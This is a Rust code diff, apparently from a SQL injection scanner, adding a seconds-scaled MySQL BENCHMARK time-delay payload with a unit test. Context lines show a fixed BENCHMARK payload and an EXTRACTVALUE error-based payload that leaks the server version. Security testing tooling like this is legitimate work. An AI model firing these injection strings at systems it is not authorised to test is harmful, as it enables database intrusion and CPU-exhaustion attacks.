@@ -21,6 +21,17 @@ pub fn mysql_time_conditional(secs: u64) -> String {
 pub fn mysql_time_benchmark() -> String {
     "' AND BENCHMARK(5000000,MD5(1)) -- -".to_owned()
 }
+
+/// Heavy-query CPU-burn with `secs`-scaled iterations: same `BENCHMARK`
+/// channel as [`mysql_time_benchmark`], but the burn grows with the
+/// requested delay so the time detector's `sleep_secs` threshold math
+/// stays meaningful (`P0-5`: `secs` × 1M `MD5` rounds ≈ `secs` seconds on
+/// commodity hardware, mirroring the SQLite `RANDOMBLOB` scaling).
+#[must_use]
+pub fn mysql_time_heavy(secs: u64) -> String {
+    let iters = secs.saturating_mul(1_000_000).max(1_000_000);
+    format!("' AND BENCHMARK({iters},MD5(1)) -- -")
+}
 #[must_use]
 pub fn mysql_error_payload() -> String {
     "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) -- -".to_owned()
@@ -65,5 +76,18 @@ mod tests {
             mysql_time_benchmark(),
             "' AND BENCHMARK(5000000,MD5(1)) -- -"
         );
+    }
+
+    #[test]
+    fn heavy_scales_with_secs() {
+        // P0-5: `secs`-scaled CPU burn, same channel, MySQL comment style.
+        let p = mysql_time_heavy(5);
+        assert_eq!(p, "' AND BENCHMARK(5000000,MD5(1)) -- -");
+        let p1 = mysql_time_heavy(1);
+        let p10 = mysql_time_heavy(10);
+        assert!(p1.contains("BENCHMARK(1000000,MD5(1))"), "{p1}");
+        assert!(p10.contains("BENCHMARK(10000000,MD5(1))"), "{p10}");
+        assert!(p10.len() > p1.len());
+        assert!(mysql_time_heavy(0).contains("BENCHMARK(1000000"), "floor");
     }
 }
